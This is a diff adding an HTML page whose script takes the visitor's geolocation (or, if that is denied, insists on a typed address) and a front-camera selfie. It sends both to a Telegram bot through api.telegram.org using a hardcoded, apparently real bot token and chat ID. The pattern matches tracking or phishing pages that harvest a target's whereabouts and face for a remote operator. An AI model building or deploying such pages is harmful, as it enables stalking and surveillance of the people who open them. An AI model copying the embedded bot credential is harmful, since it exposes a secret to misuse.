@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Send Photo & Location to Telegram</title>
+</head>
+<body>
+<h2>Send Your Location and Photo</h2>
+<button onclick="sendToTelegram()">Capture & Send</button>
+<video id="video" autoplay playsinline width="300" style="display:none;"></video>
+<canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
+
+<script>
+    const telegramBotToken = '5105771459:AAFD2B3omW17ttPH0fkdsVW47sluLcSKhJw'; // Replace with your token
+    const chatId = '781820533'; // Replace with your Telegram user/chat ID
+
+    async function sendToTelegram() {
+        let latitude = null;
+        let longitude = null;
+        let locationText = null;
+
+        // Try to get geolocation
+        const getLocation = () => {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        latitude = pos.coords.latitude;
+                        longitude = pos.coords.longitude;
+                        resolve(true);
+                    },
+                    (error) => {
+                        if (error.code === error.PERMISSION_DENIED) {
+                            const manual = prompt("Location access denied. Please enter your city or address:");
+                            if (manual) {
+                                locationText = manual;
+                                resolve(false);
+                            } else {
+                                alert("Location is required to proceed.");
+                                resolve(null); // cancel
+                            }
+                        } else {
+                            alert("Error getting location: " + error.message);
+                            resolve(null);
+                        }
+                    }
+                );
+            });
+        };
+
+        const gotLocation = await getLocation();
+        if (gotLocation === null) return; // User cancelled
+
+        // Access front camera
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' },
+                audio: false
+            });
+
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.style.display = 'block';
+
+            await new Promise(r => setTimeout(r, 1500));
+
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+            video.style.display = 'none';
+
+            canvas.toBlob(async (blob) => {
+                // Send location or manual input first
+                if (latitude && longitude) {
+                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    });
+                } else if (locationText) {
+                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `Manual location entered: ${locationText}`
+                        })
+                    });
+                }
+
+                // Then send photo
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'selfie.jpg');
+
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                alert("Photo and location sent to Telegram!");
+            }, 'image/jpeg');
+
+        } catch (err) {
+            console.error("Camera error:", err);
+            alert("Failed to access camera.");
+        }
+    }
+</script>
+</body>
+</html>
